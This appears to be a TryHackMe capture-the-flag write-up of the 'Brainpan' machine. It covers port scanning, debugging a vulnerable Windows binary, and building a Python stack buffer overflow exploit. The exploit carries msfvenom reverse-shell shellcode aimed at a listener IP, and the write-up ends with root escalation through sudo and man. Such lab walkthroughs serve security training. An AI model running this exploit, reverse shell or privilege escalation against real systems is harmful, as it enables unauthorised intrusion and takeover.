---
title: Brainpan Tryhackme Writeup
published: true
---

Today I bring you the writeup of [Brainpan](https://tryhackme.com/room/brainpan), a tryhackme machine focused on Buffer Overflow, here we go!

First we start with a port scan to see which ports are open.

```shell
nmap -sC -sV -p- --min-rate 5000 IP
```

With -p- we indicate that we want it to look at all ports,  -sC we indicate that we want to run the default nmap scripts, -sV to get the service versions and the --min-rate 5000 to do it very fast.

FOTO

It has two open ports, one web and something we don't know what it is, let's connect via netcat to that port.

```shell
nc IP 9999
```

FOTO

It looks like the program with which we have to do the BoF; now let's go to the web.

FOTO

There doesn't seem to be much, let's do some directory fuzzing to see if there is anything we don't see.

```shell
ffuf -w WORDLIST:FUZZ -u http://IP/FUZZ -t THREADS
```

Where it says WORDLIST put the path of the wordlist, in IP put the IP of the target and in THREADS the threads that we want to put, the more threads, the faster.

We get a /bin, let's see what it is.

FOTO

Let's check which architecture it is to open it with x32 or x64

FOTO 6

Ok, looks like the 9999 port binary to exploit it locally before going to the app; let's download it and exploit it on windows with [x64dbg](https://github.com/therealdreg/x64dbg-exploiting/releases/download/1.1/x64dbg-exploitingv1.1.zip), by the way, I have several [demos](https://github.com/therealdreg/x64dbg-exploiting) made in the official repo.

To install the x64dbg with plugins and so on we have to follow the [instructions](https://github.com/therealdreg/x64dbg-exploiting) of the official repo.

FOTO 7-11

Make sure to create the logs folder inside C:

FOTO 5

To configure the logs folder we have to put the following:

```shell
mona.mona("config -set workingfolder c:\\logs\\%p")
```

FOTO

If the previous commands were successful, it should look like this

FOTO

Now hit File->Open and select the vulnerable program

FOTO

FOTO

Click two times on the Run icon to open the program

FOTO

FOTO

Perfect, let's start with the attack, first we must find out how many characters we have to put to overflow the stack; to do this, without leaving the log we put the following command:

```shell
mona.mona("pattern_create 1000")
```

FOTO

Copy the output of the command and paste it into a .txt file

FOTO

Now let's start the script to do our local testing:

```python
import socket
import time
import sys

target = '127.0.0.1'
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send((buffer))
s.close()
```

FOTO

Now execute the exploit.

FOTO 22

Once finished, we go to log and type the following command to find out the offset needed for the bof

```shell
mona.mona("pattern_offset EIP")
```

FOTO

FOTO 23

FOTO 24

As we can see, it tells us that there are 524 characters, taking this into account, let's modify the script:

```python
buffer = '\x41' * 524
```

FOTO

For now our script only has the overflow characters, now we have to find out the badchars for the shellcode

First we go to log and put this:

```shell
mona.mona("bytearray")
```

FOTO

FOTO

We copy the characters and insert them at the end of the script like this:

```python
buffer += "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
buffer += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
buffer += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
buffer += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
buffer += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
buffer += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
buffer += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
buffer += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

FOTO

FOTO

Now restart the app and then run the exploit

FOTO

FOTO

FOTO

When finished we will see if the characters were copied, go to cpu->lower left window and right click->go to->expression and set esp.

FOTO

FOTO

As we can see, nothing has been copied, 00 badchar

FOTO

Go to log and generate another bytearray without 00 with:

```shell
mona.mona('bytearray -cpb "\\x00"')
```

FOTO

FOTO

Now we copy the output again, put it in the exploit removing the previous one, run it, and so on until we have all the badchars; I am going to do it only with images to make it faster; remember to restart the program every time you run the exploit

FOTO

FOTO

FOTO

FOTO

FOTO

FOTO

Apparently only the 00 was a badchar, now, let's locate some memory space that does not change with each execution, that is, that does not have ASLR.

FOTO

FOTO

FOTO

FOTO

Now we are going to use mona to see if we can locate any jmp esp of a .dll and then put the shellcode at the top of the stack and then we will have the return address that we have to put after the script characters to execute the shellcode once we have it.

We go to log and execute:

```shell
mona.mona("jmp -r esp")
```

FOTO

FOTO

FOTO

There is only one memory address that jumps to esp and it is quite useful, let's add it to the script.

```python
import socket
import time
import sys

target = '127.0.0.1'
port = 9999

buffer = '\x41' * 524
buffer += '\xf3\x12\x17\x31'


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
print(buffer)
s.send((buffer))
s.close()
```

FOTO

Now we only need the shellcode itself, for this, we are going to use msfvenom with the following syntax:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.155.220 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
```

FOTO

Finally we would only have to modify the script adding that shellcode and changing the target by the real target and execute, but first we have to open the port that we have put in the msfvenom.

```shell
nc -lvp 4444
```

```python
import socket

target = 'IP'
port = 9999

buffer = '\x41' * 524
buffer += '\xf3\x12\x17\x31'
shellcode =  b""
shellcode += b"\xdb\xd3\xb8\xde\xc4\x7c\x8b\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x12\x31\x43\x17\x83\xeb\xfc"
shellcode += b"\x03\x9d\xd7\x9e\x7e\x10\x03\xa9\x62\x01\xf0"
shellcode += b"\x05\x0f\xa7\x7f\x48\x7f\xc1\xb2\x0b\x13\x54"
shellcode += b"\xfd\x33\xd9\xe6\xb4\x32\x18\x8e\x4c\xcd\x41"
shellcode += b"\x92\x39\xcf\x75\x3b\xe6\x46\x94\x8b\x70\x09"
shellcode += b"\x06\xb8\xcf\xaa\x21\xdf\xfd\x2d\x63\x77\x90"
shellcode += b"\x02\xf7\xef\x04\x72\xd8\x8d\xbd\x05\xc5\x03"
shellcode += b"\x6d\x9f\xeb\x13\x9a\x52\x6b"
buffer += '\x90' * 32
buffer += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
print(buffer)
s.send((buffer))
s.close()
```

FOTO

And we're in! Let's escalate privileges now.

FOTO

Let's see the sudo -l of our user

```shell
sudo -l
```

FOTO

We see an executable of its own that when executed we can see that one of the options is the man command, let's see if it has an entry in [gtfobins](https://gtfobins.github.io/gtfobins/man/#sudo).

FOTO

If it has, let's use it to see if it works.

```shell
sudo -u root /home/anansi/bin/anansi_util
manual man
!/bin/sh
```

FOTO

FOTO

FOTO

And there it is, we are root!
